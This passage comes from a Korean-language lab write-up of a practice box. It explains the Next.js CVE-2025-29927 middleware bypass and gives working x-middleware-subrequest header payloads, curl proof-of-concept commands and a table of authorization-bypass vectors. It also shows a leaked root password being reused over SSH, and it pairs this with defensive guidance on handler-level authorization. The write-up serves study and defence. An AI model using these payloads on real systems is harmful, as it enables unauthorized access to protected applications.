> 즉 `chunks/pages/`를 보고 "Pages Router니까 `pages/_middleware`"라고 추론하는 것은 **인과가 틀렸다.** 판별 기준은 라우터가 아니라 **12.2 이전인가**다.
> 실물 반증: 산출물의 재현랩 `CVE-2025-29927/next15/`(next 15.1.7)는 `pages/` 디렉터리를 쓰면서도 미들웨어는 **루트 `middleware.ts`** 다.

```http
# Next.js 11.1.4 ~ 12.1 — 구식 pages/_middleware.ts
x-middleware-subrequest: pages/_middleware

# Next.js 12.2 ~ 15.x — 루트 middleware.ts (12.2부터 이 배치로 강제)
x-middleware-subrequest: middleware

# 소스가 src/ 아래에 있는 프로젝트 (src/middleware.ts)
x-middleware-subrequest: src/middleware

# Next.js 15.x — 같은 이름 5회 이상 (재귀 깊이 카운트)
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

> [!tip] 버전을 모를 때 쓰는 **만능 값**
> `split(':')` 후 `includes()`(구버전) 또는 **개수 세기**(15.x) 둘 다를 만족시키려면, 후보 이름을 각각 5번씩 섞어 넣으면 된다:
> ```
> x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:pages/_middleware
> ```
> **이 박스에서 실제로 쓴 값은 `middleware` 5회 반복으로 확정됐다** — 산출물 `~/PG/MiddlewareBypass/CVE-2025-29927/poc.sh`에 남아 있다(3장에 원문 인용). 즉 **모듈 이름은 루트 `middleware`**다.
> 만약 이 박스가 **구버전(12.2 미만)이라면** `pages/_middleware`도 후보였겠지만, `middleware`가 통했으므로 그 가지는 닫힌다. 미해소로 남는 것은 **Next.js 정확한 버전** 하나뿐이다 `[가정]`.
> **시험장 원칙: 버전 특정에 시간을 쓰지 말고 만능 값을 한 번 던져 본다.** 실패하면 그때 버전을 판다.

> [!danger] 정탐/오탐 판정 기준 — 무엇을 봐야 "진짜 뚫렸다"인가
> 이 CVE는 **성공과 실패가 둘 다 조용하다.** 예외도, 에러 페이지도 없다. 아래 표로만 판정한다.
>
> | 관측 | 판정 |
> |---|---|
> | 헤더 없이 `307` + `location: /unauthorized`, 헤더 있으면 **`200` + 보호 콘텐츠** | **정탐 확정** |
> | 헤더 유무 관계없이 계속 `307` | 미들웨어 이름 불일치 · 패치됨 · 프록시가 헤더 제거 — **셋을 구분할 수 없다**(6장 ⑥) |
> | 헤더 있으면 `200`인데 **본문이 `/unauthorized` 내용** | 우회 실패. `-L`을 붙였거나 미들웨어가 rewrite로 처리 |
> | 헤더 유무 관계없이 계속 `200` | 애초에 보호되지 않는 경로. **`matcher` 범위 밖** — 다른 경로를 찾아라 |
> | `400 Bad Request` | 헤더 값에 허용되지 않는 문자(개행·널)가 섞였다. 값을 다시 확인 |
>
> **보고서에 쓸 증거는 "헤더 유무만 다른 두 요청의 응답 쌍"이다.** 한쪽만 캡처하면 정탐 증명이 안 된다.

> [!warning] HTTP 헤더 이름은 대소문자 무시지만, **값은 아니다**
> `X-Middleware-Subrequest`로 보내도 서버는 소문자로 정규화해서 읽으므로 문제없다.
> 그러나 값의 `middleware` / `src/middleware`는 **모듈 이름과 정확히 일치**해야 한다. `Middleware`·`/middleware`·`middleware.ts`는 전부 실패한다.

### 2-4. 미들웨어가 있는지 **밖에서** 판별하는 법

페이로드를 던지기 전에 "이 앱에 미들웨어가 있는가"를 먼저 확정해야 한다. 없는 앱에 헤더를 얹어봐야 아무 일도 안 일어나고, 그걸 "패치됨"으로 오독하면 방향이 통째로 틀어진다.

| 신호 | 어디서 | 의미 |
|---|---|---|
| **307 Temporary Redirect** + `location: /login`·`/unauthorized` | 보호 라우트 응답 헤더 | `NextResponse.redirect()`의 기본 코드가 **307**이다. 302가 아니라 307이면 미들웨어일 확률이 크다 |
| `x-middleware-rewrite` | 응답 헤더 | 미들웨어가 `NextResponse.rewrite()`를 호출했다는 **직접 증거** |
| `x-middleware-next: 1` | 응답 헤더 | 미들웨어가 `NextResponse.next()`로 통과시켰다는 표식 |
| `x-nextjs-rewrite` / `x-nextjs-redirect` | 응답 헤더 | 라우팅 계층 개입 흔적 |
| `/unauthorized`·`/denied` 페이지 청크 존재 | `_buildManifest.js`, `chunks/pages/` | **"차단 시 보낼 곳"을 만들어 뒀다** = 차단 로직이 있다 |
| 같은 경로가 쿠키 유무에 따라 200/307으로 갈림 | 비교 요청 | 세션 기반 판정이 앞단에 있다 |

```bash
# 미들웨어 지문 한 번에 확인 — 리다이렉트를 따라가지 않는 것이 핵심
curl -sD - -o /dev/null http://192.168.248.215:3000/admin
curl -sD - -o /dev/null http://192.168.248.215:3000/ | grep -iE 'x-middleware|x-nextjs'
```

> [!warning] 307과 302를 구분하는 습관
> `302 Found`는 전통적인 서버측 리다이렉트에서 흔하고, **`307 Temporary Redirect`는 메서드와 본문을 보존**하는 코드다. Next.js 미들웨어의 `NextResponse.redirect()`가 기본으로 307을 쓴다.
> feroxbuster 출력의 `307 ... 13c`가 바로 이것이었다 — **307 자체가 "미들웨어가 살아 있다"는 지문**이었는데, 스캐너가 그걸 필터로 지워 버렸다(6장 ①).

### 2-5. 미들웨어 인가 vs 핸들러 인가 — 코드로 보는 차이

같은 `/admin` 페이지를 두 방식으로 보호했을 때 무엇이 달라지는지가 이 박스 전체의 요약이다.

```ts
// ❌ 취약 — 이 박스의 구조 [가정]. 인가가 middleware.ts에만 있다
// middleware.ts
export function middleware(req: NextRequest) {
  if (!isAdmin(req.cookies.get('session'))) {
    return NextResponse.redirect(new URL('/unauthorized', req.url))
  }
  return NextResponse.next()
}
export const config = { matcher: ['/admin/:path*'] }   // ← 최소 /admin 포함, 실제 범위 미상 [가정] (2-1 참조)

// pages/admin.tsx — 검사가 전혀 없다. "미들웨어가 이미 걸렀다"고 가정
export default function Admin() {
  return <div>root:modeling-katja-lad-common</div>   // ← 미들웨어만 지나면 그대로 노출
}
```

```ts
// ✅ 안전 — 자원을 내주는 코드가 스스로 검사한다
// pages/admin.tsx
export async function getServerSideProps(ctx) {
  const session = await getSession(ctx.req)
  if (!isAdmin(session)) {
    return { redirect: { destination: '/unauthorized', permanent: false } }
  }
  return { props: { /* 비밀은 여전히 내려보내지 않는 편이 낫다 */ } }
}
```

> [!danger] 차이는 단 하나 — **"누가 마지막으로 확인하는가"**
> 위쪽은 미들웨어를 건너뛰는 방법 하나로 전부 무너진다. 아래쪽은 미들웨어를 100% 우회해도 **`getServerSideProps`가 다시 막는다.**
> 미들웨어 우회 CVE가 나와도, API 게이트웨이가 오설정돼도, 백엔드 포트가 직접 노출돼도 **아래쪽은 살아남는다.**
>
> **이것이 "심층 방어"의 구체적 모습이다.** 앞단 검사를 없애라는 말이 아니라, **앞단 검사를 뒷단 검사의 대체물로 쓰지 말라**는 뜻이다.

### 2-6. 구조적 결함 — 앞단 인가(front-layer authorization)는 왜 반복해서 무너지는가

이 박스의 진짜 교훈은 CVE 번호가 아니다. **"인가 판정이 요청을 처리하는 주체와 다른 곳에 있다"** 는 배치 자체가 결함이다.

> [!danger] 규칙: 인가는 **자원을 내주는 코드**와 같은 자리에 있어야 한다
> 미들웨어·리버스 프록시·WAF·API 게이트웨이는 **필터**지 **인가**가 아니다.
> 필터를 건너뛰는 경로가 하나라도 존재하면 뒷단은 무방비다. 그리고 **경로는 거의 항상 존재한다.**
>
> 검증 질문 3개:
> 1. 이 필터를 우회하면 뒷단이 스스로 막는가? (이 박스: **아니오**)
> 2. 뒷단에 **직접 도달**할 수 있는가? (백엔드 포트 노출·컨테이너 내부·SSRF)
> 3. 필터와 뒷단이 **경로/메서드/헤더를 똑같이 해석**하는가?

### 2-7. 우회 벡터 일반론 — 앞단 인가를 만나면 순서대로 때린다

CVE-2025-29927은 아래 표의 **1번 항목**의 한 사례일 뿐이다. 시험에서 만날 나머지도 전부 같은 뿌리다.

| # | 벡터 | 시도할 것 | 왜 통하는가 |
|---|---|---|---|
| 1 | **헤더 주입** | `x-middleware-subrequest` · `X-Forwarded-For: 127.0.0.1` · `X-Real-IP` · `X-Remote-User: admin` · `X-Original-URL: /admin` · `X-Rewrite-URL: /admin` | 앞단이 붙이는 "내부 표식"을 **외부에서 지우지 않고 그대로 신뢰** |
| 2 | **경로 정규화 차이** | `/admin` → `//admin` · `/./admin` · `/admin/` · `/admin/.` · `/%61dmin` · `/%2561dmin` · `/admin;x=1` · `/ADMIN` | 프록시는 리터럴 문자열로 매칭하고, 백엔드는 **정규화 후** 라우팅한다 → 같은 자원을 다른 문자열로 부를 수 있다 |
| 3 | **HTTP 메서드 변경** | `GET`→`POST`·`HEAD`·`PUT`·`OPTIONS`·`TRACE`, 그리고 `X-HTTP-Method-Override: GET` | 규칙이 `<Limit GET>`처럼 **특정 메서드에만** 걸려 있다 |
| 4 | **HTTP 버전/파싱 불일치** | HTTP/1.0으로 요청, 절대 URI(`GET http://host/admin HTTP/1.1`), 헤더 중복·공백·`\t` 삽입 | 프록시와 백엔드의 파서 관대함이 다르다 |
| 5 | **백엔드 직접 접근** | 앞단이 443만 노출해도 백엔드 3000·8080이 열려 있는지 확인 | 필터를 아예 지나치지 않는다 |
| 6 | **대소문자·인코딩** | `/Admin` · `/aDmIn` · `%2e%2e%2f` | 프록시 매칭이 대소문자 구분, 백엔드 라우팅은 무시(또는 반대) |

> [!danger] 이 결함들이 반복되는 단 하나의 이유
> **"요청을 파싱하는 주체가 둘 이상이면 해석이 갈린다."**
>
> HTTP request smuggling(프론트엔드와 백엔드가 `Content-Length`/`Transfer-Encoding`을 다르게 읽는 것), 프록시 경로 우회(`/./`·`//`), 그리고 이 CVE(프레임워크 내부 표식을 외부 입력과 구분 못 함) — **셋 다 같은 뿌리다.**
> 두 파서가 같은 바이트열을 보고 **다른 결론**에 도달하는 순간, 앞단의 판단은 뒷단의 현실과 어긋난다.
> **파서가 하나면 이 클래스 전체가 사라진다.** 그래서 방어의 답은 "정규화를 한 곳에서, 인가를 핸들러에서"다(8장).

### 2-8. 왜 이 박스에서 인가 우회가 곧 **root**인가

미들웨어를 건너뛴 결과 열린 `/admin` 페이지에는 **운영 크리덴셜이 평문으로 렌더링**돼 있었다. 웹 취약점 하나가 시스템 전체 장악으로 곧장 이어진 이유는 **취약점의 위력이 아니라 크리덴셜 배치**다.

- `/admin` 페이지가 비밀을 **화면에 그린다** — 인가가 유일한 방어선
- 그 비밀이 **`root` 계정 비밀번호**다 — 권한 분리 없음
- **SSH가 `PermitRootLogin`으로 비밀번호 로그인을 허용**한다 — 재사용 경로가 열려 있음

셋 중 **하나만 끊겼어도** 이 박스는 여기서 끝나지 않았다.

---

## 3. Foothold — 미들웨어 우회로 `/admin` 접근

원문 기록:

> CVE-2025-29927 사용해서 /admin 접근

![[Pasted image 20260819111158.png]]

화면에 렌더링된 내용:

```
Admin Panel
This is an admin-only section.
root:modeling-katja-lad-common
```

> [!note] 실제로 사용한 페이로드 — 산출물에 남아 있다
> `~/PG/MiddlewareBypass/CVE-2025-29927/` 는 **`https://github.com/EQSTLab/CVE-2025-29927.git` 를 클론한 것으로 확정**됐다(`git remote -v`). 그 안의 `poc.sh` 원문:
>
> ```bash
> #!/bin/bash
>
> curl -v "http://192.168.248.215:3000/admin" \
>   -H "Host: 192.168.248.215:3000" \
>   -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
> ```
>
> **성공한 값은 `middleware` 5회 반복**이다 — 즉 모듈 이름은 루트 `middleware`, 그리고 **5회 반복이 필요했다면 15.x 계열**일 가능성이 크다(구버전은 1회로 충분하다). 다만 5회는 구버전의 `includes()`도 함께 만족시키므로 **버전 확정 근거는 되지 못한다** `[가정]`.
> 같은 디렉터리에는 exploit-db 사본 `52124.txt`와 **로컬 재현랩 `next15/`**(next 15.1.7)가 함께 있다. `next15/`는 **익스플로잇 저장소가 제공하는 자체 재현 환경**이지 타겟의 버전이 아니다 — 혼동하면 안 된다.

> [!note] 재현 절차 — 도구 없이 수동 `curl`
> 아래는 **PoC 스크립트 없이 같은 결과를 내는 절차**다 — 시험 자산은 이쪽이다.
>
> ```bash
> # ① 우회 전 — 기준선 확보 (307로 튕기는지 확인)
> curl -si http://192.168.248.215:3000/admin | head -5
> #   HTTP/1.1 307 Temporary Redirect
> #   location: /unauthorized          ← 미들웨어가 막고 있다는 증거
>
> # ② 우회 — 헤더 한 줄 추가 (만능 값)
> curl -s -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware:src/middleware:pages/_middleware' \
>      http://192.168.248.215:3000/admin
>
> # ③ 렌더된 HTML에서 크리덴셜만 뽑기
> curl -s -H 'x-middleware-subrequest: middleware' http://192.168.248.215:3000/admin \
>   | grep -oE '[a-z]+:[a-z-]+'
> ```
> **위 명령은 이 박스에서 실행 검증되지 않았다** — 타겟이 정지되어 재검증 불가하다 `[가정]`.

> [!tip] 플래그 해설 — 이 단계에서 `curl` 옵션이 왜 그것이어야 하는가
> | 옵션 | 역할 | 빼면 |
> |---|---|---|
> | `-s` | 진행률 표시 억제 | 파이프로 넘길 때 stderr가 섞여 지저분 |
> | `-i` | **응답 헤더를 본문과 함께 출력** | `location:` 헤더를 못 봐서 "어디로 튕기는지" 판단 불가 |
> | `-H '...'` | 임의 헤더 주입 | **이 익스플로잇 자체가 성립 안 함** |
> | `-L` (**쓰지 말 것**) | 리다이렉트 추종 | 307을 따라가 `/unauthorized` 본문만 보게 되어 **우회 성공 여부를 오판**한다 |
> | `-o /dev/null -w '%{http_code}\n'` | 상태코드만 뽑기 | 대량 후보를 훑을 때 유용 |

> [!danger] `-L`을 습관적으로 붙이지 마라 — 이 유형의 대표 오판
> 인가 우회 테스트에서 `-L`은 독이다. **우회에 성공했는데도 `/unauthorized` 화면을 보고 "실패했다"고 결론**낼 수 있다.
> 반대로 **307을 따라가지 않았을 때의 본문 크기 변화**가 성공 판정의 가장 빠른 지표다:
> ```bash
> for h in "" "middleware" "src/middleware" "pages/_middleware"; do
>   printf '%-20s ' "${h:-none}"
>   curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
>        ${h:+-H "x-middleware-subrequest: $h"} http://192.168.248.215:3000/admin
> done
> ```
> `307 13` → `200 <큰 수>` 로 바뀌는 줄이 정답 값이다.

> [!warning] 이 단계에 자동 도구는 필요 없다 — 그래서 시험에 강하다
> CVE-2025-29927에는 nuclei 템플릿과 여러 PoC 스크립트가 있지만, **본질은 `curl -H` 한 줄**이다.
> **자동 익스플로잇 도구가 금지된 OSCP 시험에서 이런 "헤더 한 줄" 계열 취약점은 오히려 유리하다.** 메커니즘만 알면 도구가 필요 없다.

---

## 4. 권한상승 — **없다**

원문 기록:

> 획득한 정보로 ssh 접근

`/admin`에서 얻은 `root:modeling-katja-lad-common`을 SSH에 그대로 재사용한다.

```bash
┌──(kali㉿kali)-[~/PG/MiddlewareBypass/CVE-2025-29927]
└─$ ssh root@192.168.248.215
The authenticity of host '192.168.248.215 (192.168.248.215)' can't be established.
ED25519 key fingerprint is: SHA256:GYats4sApIm2CiXiv6CqklOr+LDIDCrer/01h6J9yFg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.248.215' (ED25519) to the list of known hosts.
root@192.168.248.215's password:
Permission denied, please try again.
root@192.168.248.215's password:
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Aug 19 02:13:29 AM UTC 2026

  System load:  0.0               Processes:               155
  Usage of /:   56.8% of 9.75GB   Users logged in:         0
  Memory usage: 18%               IPv4 address for ens192: 192.168.248.215
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

137 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Apr 30 12:53:53 2025 from 192.168.118.6
root@nextjs:~# ls
proof.txt
root@nextjs:~# cat proof.txt
ba5f29a3abb6692d4a1676fc93864d6a
```

> [!note] 이 출력에서 읽어야 할 것
> | 줄 | 의미 |
> |---|---|
> | `Permission denied, please try again.` | **첫 비밀번호 시도가 실패했다** — 6장 ⑤ 참조 |
> | `root@nextjs:~#` | 프롬프트가 `#` → **이미 root.** 여기서 권한상승 단계는 종료 |
> | `Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-58-generic)` | nmap의 OS 추측(4.15–5.19)이 틀렸음을 확정 |
> | `Last login: Wed Apr 30 ... from 192.168.118.6` | 박스 제작 시점 흔적. 다른 사용자 흔적이 아니다 |
> | `Users logged in: 0` | 랩 환경 확인 |

> [!tip] 그래도 셸을 잡으면 반사적으로 치는 5줄은 친다
> root를 이미 잡았어도 **습관을 깨지 마라.** 시험장에서 "root인 줄 알았는데 컨테이너 안"인 경우가 있다.
> ```bash
> id                                   # uid=0 확인 + 그룹
> hostname; cat /etc/os-release        # 컨테이너/호스트 판별의 시작
> sudo -l                              # root면 무의미하지만 0.5초
> find / -perm -4000 -type f 2>/dev/null   # SUID
> getcap -r / 2>/dev/null               # capabilities
> cat /etc/crontab; ls -la /etc/cron.*  # 크론
> ls -la /.dockerenv /run/.containerenv # ← 컨테이너 여부. root 잡았을 때 특히
> ```
> 이 박스에서는 `ls`와 `cat proof.txt`만으로 끝났다. **호스트가 진짜 타겟인지 확인하는 것이 원칙이다.**

> [!warning] 실전이라면 Next.js 앱 소스를 확보했어야 한다
> root 셸을 잡았으니 **실제 `middleware.ts`와 `package.json`을 읽을 수 있었다.** 그러면 정확한 Next.js 버전과 `matcher` 설정이 확정되어 이 노트의 `[가정]` 표시들이 사라졌을 것이다.
> ```bash
> find / -name 'middleware*.ts' -o -name 'middleware*.js' 2>/dev/null | grep -v node_modules
> find / -name package.json -path '*next*' -prune -o -name package.json -print 2>/dev/null | head
> cat <앱경로>/package.json | grep '"next"'
> cat <앱경로>/.next/BUILD_ID
> ```
> **셸을 잡은 뒤 "어떻게 뚫렸는지"를 소스로 확인하는 습관이 다음 박스를 구한다.** 이 박스에서는 하지 않았고, 타겟이 정지되어 되돌릴 수 없다.

---

## 5. 플래그

| | 위치 | 값 |
|---|---|---|
| `proof.txt` | `/root/proof.txt` | `ba5f29a3abb6692d4a1676fc93864d6a` |
| `local.txt` | **관측되지 않음** | 원문·산출물에는 **`root` 플래그만 관측됐다.** 사용자 단계가 애초에 없는 구성인지, 있었는데 수집하지 않았는지는 근거가 없다 `[가정]` |

> [!tip] 시험 증거 형식 연습
> 실제 시험은 플래그만으론 인정되지 않는다. **한 화면에** 담아라:
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스라면 출력이 `root` / `nextjs` / `192.168.248.215` / `ba5f29a3abb6692d4a1676fc93864d6a` 로 한 화면에 나온다.
> **`ip a`를 빼먹으면 어느 호스트인지 증명이 안 된다** — 채점에서 가장 흔한 감점 사유다.

---

## 6. 막혔던 지점 / 시행착오

### ① `/admin`이 디렉터리 스캔 결과에 안 나온다 — 이 박스의 진짜 함정

feroxbuster 결과 29건 어디에도 `/admin`이 없다. 그런데 정답 경로는 `/admin`이다.

```
307      GET        1l        1w       13c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
```

이 한 줄이 원인이다. feroxbuster의 자동 필터가 **"307 + 본문 13바이트"** 를 404 유사 응답으로 판정하고, 그 이후 모든 307을 화면에서 지웠다.

> [!danger] 스캐너의 "지능"이 정답을 지운다
> 자동 404 필터링은 **와일드카드 응답을 걸러주는 유용한 기능**이다. 하지만 **인가 실패 응답이 그 와일드카드와 같은 모양일 때** 보호된 자원을 통째로 숨긴다.
> 이 박스에서 `307 → /unauthorized` 는 정확히 그런 형태였다.
>
> **일반화된 반사:**
> 1. 스캔 결과에 **`/unauthorized`·`/login`·`/denied` 같은 "차단 착지 페이지"가 보이면** → 반드시 무언가가 리다이렉트되고 있다 → **자동 필터를 끄고 다시 돌려라**
> 2. `Auto-filtering found 404-like response` 줄이 **404 말고 다른 코드**에 붙었다면 → 그 코드가 곧 "보호된 자원"의 지문이다
> 3. 워드리스트 스캔은 **한 번 더, 다른 필터 설정으로** 돌리는 값이 있다
>
> ```bash
> feroxbuster -u http://192.168.248.215:3000/ -w <wordlist> --dont-filter -t 100
> ffuf -u http://192.168.248.215:3000/FUZZ -w <wordlist> -mc all -fc 404 -fs 2169
> gobuster dir -u http://192.168.248.215:3000/ -w <wordlist> -s 200,204,301,302,307,308,401,403 -b ''
> ```

**소요 시간 관점:** feroxbuster 스캔 자체가 4분이다. 결과에 `/admin`이 없다고 "관리자 페이지가 없다"고 결론내면 **엉뚱한 방향(SSH 브루트포스, API 퍼징)으로 30분 이상이 사라진다.** `/unauthorized` 한 줄이 그 손실을 막아주는 신호였다.

### ② 버전 특정에 매달리면 시간이 녹는다

Next.js는 응답에 버전을 노출하지 않는다(`X-Powered-By: Next.js` — 숫자 없음). 이 상태에서 "정확한 버전을 알아야 페이로드를 고를 수 있다"고 생각하면 자산 해시 대조에 한참을 쓴다.

> [!tip] 순서를 뒤집어라
> **버전 → 페이로드**가 아니라 **만능 페이로드 → 성공/실패 → 필요하면 그때 버전**이다.
> 이 CVE는 후보가 3개뿐(`middleware` · `src/middleware` · `pages/_middleware`)이고, `:`로 이어 붙여 **한 번에 다 시도**할 수 있다. 4번의 요청이면 전수 검증이 끝난다.
> **"정보가 없으면 시도로 좁힌다."** 특히 후보 공간이 손가락으로 셀 수 있을 때는 항상 그렇다.

### ③ 우회 성공 판정을 잘못하는 법 — `-L`과 브라우저

원문에 이 실패가 기록돼 있지는 않다. **이 유형에서 흔히 막히는 지점**으로 적는다:

- `curl -L`을 붙이면 307을 따라가 `/unauthorized` 본문을 받는다 → **성공했는데 실패로 오판**
- 브라우저로 테스트하면 헤더를 얹을 수 없다 → 확장/프록시 없이는 재현 불가
- Burp Repeater에서 **"Follow redirections" 옵션이 켜져 있으면** 같은 오판이 난다

**판정은 상태코드와 본문 크기로 한다.** `307 / 13바이트` → `200 / 2000바이트대` 로 바뀌면 성공이다.

### ④ 미들웨어 이름이 안 맞으면 조용히 실패한다

이 CVE의 실패는 **에러를 내지 않는다.** 값이 틀리면 그냥 평소대로 미들웨어가 돌아 307이 나온다. "취약하지 않다"와 "이름이 틀렸다"가 **응답상 구별되지 않는다.**

> [!warning] "취약하지 않다"고 결론내기 전 반드시 확인할 것 — 이 유형에서 흔히 막히는 지점
> | 확인 | 방법 |
> |---|---|
> | 이름 후보를 다 시도했는가 | `middleware` · `src/middleware` · `pages/_middleware` |
> | 15.x용 5회 반복을 시도했는가 | `middleware:middleware:middleware:middleware:middleware` |
> | 앞단 프록시가 헤더를 지우고 있는가 | 다른 커스텀 헤더가 백엔드에 도달하는지 별도 확인 |
> | 애초에 미들웨어가 있는 앱인가 | 보호 라우트가 **307/302**로 튕기는지 (403이면 미들웨어가 아니라 핸들러 검사일 수 있다) |
> | 대상 경로가 `matcher` 범위인가 | 보호되지 않는 경로에 헤더를 얹어봐야 아무 변화 없다 |

### ⑤ SSH 첫 시도가 실패했다

```
root@192.168.248.215's password:
Permission denied, please try again.
root@192.168.248.215's password:
Welcome to Ubuntu 24.04.1 LTS ...
```

첫 입력이 거부되고 두 번째에 붙었다. 원문에 사유 기록은 없다 — **오타, 또는 `modeling-katja-lad-common`이 아닌 다른 값을 먼저 시도한 것**으로 본다 `[가정]`.

> [!warning] 이 한 줄이 시험장에서 치명적일 수 있다
> **크리덴셜을 화면에서 눈으로 옮겨 적으면 반드시 틀린다.** 특히 하이픈이 섞인 4단어형(`modeling-katja-lad-common`)은 `-`와 `_`, `l`과 `1`, `0`과 `O` 혼동이 잦다.
> - 화면 텍스트는 **복사**하거나, 스크린샷이면 `curl`로 HTML을 받아 `grep`으로 뽑아라
> - SSH 비밀번호는 `sshpass -p '<pw>' ssh root@TARGET` 로 **한 번에** 넣어 오타를 배제한다 (테스트 환경 한정)
> - **"Permission denied"를 보고 "이 크리덴셜은 가짜다"라고 결론내지 마라.** 최소 2번은 정확히 다시 쳐본다
>
> 실제로 이 박스에서 "1회 실패"를 "크리덴셜 무효"로 읽었다면 **정답을 손에 쥐고도 다른 경로를 파느라 시간을 태웠을 것**이다.

### ⑥ 앞단 프록시가 헤더를 지워서 실패하는 경우 — 이 유형에서 흔히 막히는 지점

원문에는 이 실패가 없다(이 박스는 Next.js가 3000번에 **직접 노출**돼 있어 중간 계층이 없었다). 그러나 실전에서는 가장 흔한 실패 원인이다.

Next.js 앞에 nginx/Cloudflare/ALB가 있고 **이미 완화 조치가 적용된 환경**이라면, `x-middleware-subrequest`가 백엔드에 도달하기 전에 제거된다. 이때 응답은 **취약하지 않은 것과 완전히 동일**하다.

> [!warning] "헤더가 백엔드까지 가는가"를 먼저 확인하라
> 익스플로잇 헤더가 아니라 **아무 커스텀 헤더**를 하나 보내서 반사되는지 본다:
> ```bash
> # 앱이 헤더를 반사해주는 엔드포인트가 있으면 가장 확실하다
> curl -s -H 'X-Probe-Canary: abc123' http://TARGET:3000/api/<echo류> | grep -i canary
>
> # 없으면 간접 확인: 프록시가 헤더 개수·크기 제한에 걸리는지
> curl -sI -H 'X-Probe-Canary: abc123' http://TARGET:3000/
> ```
> 중간 계층이 있는지 자체를 판별하는 신호:
> - `Server:` 헤더가 Next.js가 아니라 `nginx`/`cloudflare`
> - 응답에 `CF-Ray`·`X-Cache`·`Via`·`X-Amz-Cf-Id`
> - **백엔드 포트(3000·8080)가 별도로 열려 있으면 프록시를 아예 건너뛴다** — 2-7장 표 5번 벡터
>
> **이 박스는 3000이 직접 열려 있었다.** 즉 우회할 프록시조차 없는 최선의 조건이었다. 실전에서 실패하면 **프록시를 지나칠 방법**을 먼저 찾아라.
>
> 그리고 그 판단의 근거가 정찰 단계에 이미 있었다 — `whatweb.txt`:
> ```
> http://192.168.248.215:3000 [200 OK] Country[RESERVED][ZZ], HTML5, IP[192.168.248.215], Script[application/json], X-Powered-By[Next.js]
> ```
> **`Server` 헤더가 아예 없고 `X-Powered-By[Next.js]`만 있다.** `nginx`·`cloudflare` 같은 값도, `CF-Ray`·`Via`·`X-Cache`도 없다 → **중간 계층 없음**을 페이로드를 던지기 전에 확정할 수 있었다. whatweb 출력은 배너 나열이 아니라 **"헤더가 백엔드까지 가는가"의 사전 판정 자료**다.

### ⑦ `/unauthorized`가 200으로 나온 것을 흘려보내면 안 됐다

feroxbuster 결과에서 `/unauthorized`는 **200**으로 정상 표시됐다. 이 페이지의 존재 자체가 "차단 로직이 있고, 차단당한 사용자를 여기로 보낸다"는 뜻이다.

**논리 순서:**
```
/unauthorized 페이지가 존재한다
  → 누군가를 차단하고 있다
    → 차단당하는 대상 경로가 있다
      → 그 경로는 스캔 결과에 안 보인다 (307이 필터됐으니까)
        → 필터를 끄고 다시 스캔하거나, _buildManifest.js를 읽어라
```

> [!tip] "결과에 없는 것"을 추론하는 습관
> 디렉터리 스캔은 **찾은 것**만 보여준다. 학습해야 할 것은 **"찾지 못한 것이 무엇을 뜻하는가"** 다.
> | 결과에 보이는 것 | 추론해야 할 것 |
> |---|---|
> | `/login`·`/unauthorized`·`/denied` | 보호된 경로가 어딘가에 있다 |
> | `/admin` 없이 `/administrator`만 | 두 라우트가 같은 앱을 가리킬 수 있다 |
> | `Auto-filtering` 줄이 404 외의 코드에 붙음 | **그 코드가 곧 보호 자원의 지문**이다 |
> | 정적 자산(`/_next/`)만 잔뜩 | 워드리스트가 앱 라우팅과 안 맞는다 → 프레임워크 고유 열거로 전환 |

### ⑧ 이 유형에서 흔히 막히는 지점 — 원문 밖의 일반 함정

원문에 실측 기록이 없으므로 **일반 함정**으로 구분해 적는다.

| 함정 | 증상 | 탈출 |
|---|---|---|
| 3000번을 "개발 서버라 별거 없다"고 후순위로 미룸 | 22·3000 두 포트뿐인데 SSH만 판다 | **열린 포트가 2개면 웹이 곧 유일한 공격면**이다 |
| 라우터 종류(App/Pages)로 헤더 값을 고르려 함 | 모듈 이름은 **버전**이 정한다(12.2 이전만 `pages/_middleware`). 라우터로는 갈리지 않는다 — 2-3장 | 값을 고르지 말고 **`:`로 이어 붙여 한 번에** 던진다. 이 박스의 정답은 `middleware`×5였다 |
| API 라우트(`/api/*`)를 열거하지 않음 | 미들웨어가 API도 보호하는 경우가 많다 | `/api/` 하위를 별도 워드리스트로 스캔. **API가 더 많은 것을 흘린다** |
| 크리덴셜을 SSH에만 시도 | 재사용처를 놓친다 | 웹 로그인 · DB · 다른 호스트에도 시도 |
| root 셸을 잡고 즉시 종료 | 왜 뚫렸는지 학습 기회 상실 | **소스와 설정 파일을 읽고 나온다** (4장 마지막 참조) |
| `PermitRootLogin` 없는 박스에서 root 비번을 얻음 | SSH가 거부됨 | 다른 사용자로 붙어 `su root` 또는 웹셸 경유 |

### ⑨ 박스 이름이 답을 흘렸다 — 그리고 시험장에는 그 힌트가 없다

이 박스의 이름은 **`MiddlewareBypass`** 이고, 호스트명은 **`nextjs`** 다. `X-Powered-By: Next.js`를 본 순간 "Next.js + 미들웨어 우회 = CVE-2025-29927"이 즉시 성립한다. **랩이라서 성립하는 지름길이다.**

> [!danger] 이름 힌트에 의존하면 시험장에서 무너진다
> OSCP 시험 박스에는 `MiddlewareBypass` 같은 친절한 이름이 없다. 이름 없이 같은 결론에 도달하는 **증거 사슬**을 몸에 붙여야 한다:
>
> ```
> ① X-Powered-By: Next.js                      → 프레임워크 확정
> ② _next/static/chunks/pages/                 → Pages Router 확정
> ③ /unauthorized 페이지 존재                   → 차단 로직 존재
